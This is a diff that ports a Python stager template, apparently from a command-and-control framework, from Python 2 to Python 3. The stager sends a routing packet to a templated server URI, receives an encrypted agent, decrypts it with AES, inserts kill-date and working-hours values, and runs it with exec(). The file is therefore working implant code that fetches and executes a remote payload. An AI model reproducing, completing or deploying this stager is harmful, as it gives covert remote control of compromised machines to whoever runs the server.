@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 """
 This file is a Jinja2 template.
@@ -10,10 +10,12 @@ This file is a Jinja2 template.
         stage_1
         stage_2
 """
+from __future__ import print_function
 
+import copy
 import random
 import string
-import urllib2
+import urllib.request as urllib
 
 {% include 'common/rc4.py' %}
 {% include 'common/aes.py' %}
@@ -22,10 +24,10 @@ import urllib2
 
 def post_message(uri, data):
     global headers
-    return (urllib2.urlopen(urllib2.Request(uri, data, headers))).read()
+    return (urllib.urlopen(urllib.Request(uri, data, headers))).read()
 
 # generate a randomized sessionID
-sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(8))
+sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
 
 # server configuration information
 stagingKey = '{{ staging_key }}'
@@ -97,4 +99,5 @@ response = post_message(postURI, routingPacket)
 agent = aes_decrypt_and_verify(key, response)
 agent = agent.replace('REPLACE_WORKINGHOURS', WorkingHours)
 agent = agent.replace('REPLACE_KILLDATE', KillDate)
+
 exec(agent)
